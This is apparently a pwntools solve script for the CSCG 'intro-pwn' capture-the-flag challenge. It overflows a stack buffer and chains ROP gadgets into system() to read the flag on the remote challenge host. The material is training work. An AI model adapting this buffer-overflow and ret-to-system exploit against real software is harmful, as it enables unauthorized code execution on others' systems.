from pwn import *
import sys

link = "b595a0ec4658f951c4b167ac-1024-intro-pwn-1.challenge.cscg.live"
debug = False if len(sys.argv) < 2 else bool(int(sys.argv[1]))
port = None if len(sys.argv) < 3 else int(sys.argv[2])

e = context.binary = ELF("intro-pwn")
gets_buf = 0x7fffffffe360
ret_addr = 0x7fffffffe378
offset = ret_addr - gets_buf

# write shell arg to stack
print(e.got['system'])

# rop gadget
padding = b'A' * offset
addr_rdi_gadget = p64(0x401205)
addr_command = p64(0x402010)   # address of cat /flag for you
stack_align_ret = p64(0x401222)
addr_system = p64(0x401040)  # address of system in plt

# ret to sys call
payload = padding + addr_rdi_gadget + addr_command + stack_align_ret + addr_system

if not debug:
    conn = remote(link, port, ssl=True)
else:
    conn = process("./intro-pwn")

pause()
conn.sendline(payload)
print(conn.recvall().decode('ascii'))